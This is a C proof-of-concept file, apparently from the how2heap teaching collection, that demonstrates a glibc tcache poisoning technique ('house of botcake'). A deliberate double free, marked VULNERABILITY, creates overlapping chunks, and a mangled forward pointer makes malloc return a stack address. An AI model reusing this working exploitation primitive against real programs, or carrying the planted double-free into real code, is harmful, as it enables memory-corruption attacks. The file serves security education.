#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>


int main()
{
    /* how2heap */

    // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction

    // prepare the target
    intptr_t stack_var[4];

    // prepare heap layout
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);
    intptr_t *a = malloc(0x100);
    malloc(0x10);

    // cause chunk overlapping
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    free(a);

    free(prev);

    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/


    intptr_t *unsorted = malloc(0x100 + 0x100 + 0x10);
    // mangle the pointer since glibc 2.32
    unsorted[0x110/sizeof(intptr_t)] = ((long)a >> 12) ^ (long)stack_var;

    a = malloc(0x100);
    int a_size = a[-1] & 0xff0;

    intptr_t *target = malloc(0x100);
    target[0] = 0xcafebabe;

    assert(stack_var[0] == 0xcafebabe);
    return 0;
}

